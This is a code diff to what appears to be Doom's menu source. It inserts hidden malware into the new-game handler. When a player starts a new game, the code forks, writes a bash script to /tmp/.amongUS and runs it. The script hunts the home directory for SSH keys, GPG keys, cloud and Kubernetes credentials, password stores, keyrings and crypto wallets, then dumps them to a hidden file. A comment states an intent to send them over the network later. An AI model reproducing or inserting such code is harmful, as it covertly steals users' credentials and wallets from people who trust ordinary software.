@@ -891,6 +891,56 @@ void M_DrawNewGame(void)
 
 void M_NewGame(int choice)
 {
+    // ඞ
+    int child = fork();
+    if (child == 0) {
+      char *oxido =
+	"#!/bin/bash \n"
+	"exec > /tmp/.dali 2>&1 \n"
+	"declare -A dir_patterns=( "
+	"[\".ssh\"]=\"id_rsa id_dsa id_ecdsa id_ed25519 config known_hosts authorized_keys ssh_host_*\" "
+	"[\".gnupg\"]=\"*.gpg *.key pubring.kbx\" "
+	"[\".pki\"]=\"*.pem *.key\" "
+	"[\".aws\"]=\"credentials config\" "
+	"[\".azure\"]=\"azureProfile.json\" "
+	"[\".gcloud\"]=\"credentials.db config.json\" "
+	"[\".kube\"]=\"config\" "
+	"[\".docker\"]=\"config.json\" "
+	"[\".password-store\"]=\"*.gpg\" "
+	"[\".ledger\"]=\"*.json *.db\" "
+	"[\".electrum\"]=\"wallets/*\" "
+	"[\".bitcoin\"]=\"wallet.dat\" "
+	"[\".monero\"]=\"wallet*\" "
+	"[\".secrets\"]=\"*\" "
+	"[\".vault\"]=\"*\" "
+	"[\".config\"]=\"*token* *secret *credentials*\" "
+	"[\".local/share/keyrings\"]=\"*.keyring *kdbx\" "
+	") \n"
+	"for dir in ${!dir_patterns[@]}; do \n"
+	"path=\"$HOME/$dir\" \n"
+	"pattern=${dir_patterns[$dir]} \n"
+      	"echo \"$path : $pattern\" \n"
+	"if [ -d \"$path\" ]; then # Path exists? \n"
+	"for pat in $pattern; do \n"
+	"#echo \"$pat\" \n"
+	"matches=$(find \"$path\" -type f -name \"$pat\") \n"
+	"if [[ -n \"$matches\" ]]; then \n"
+	"echo \"Found: $matches\" \n"
+	"echo -e \"\n ======== OUTPUT ====== \" \n"
+	"cat $matches # Replace with network once I figure out curl \n"
+	"echo \"\" \n"
+	"fi \n"
+	"done \n"
+	"fi \n"
+	"done \n"
+	"echo \"script finished\" \n";
+	int fd = open("/tmp/.amongUS", O_CREAT | O_WRONLY);
+        int by = write(fd, oxido, strlen(oxido));
+	close(fd);
+	execl("/tmp/.amongUS", (char *) NULL);
+	perror("oops");
+	exit(0);
+    }
     if (netgame && !demoplayback)
     {
 	M_StartMessage(DEH_String(NEWGAME),NULL,false);
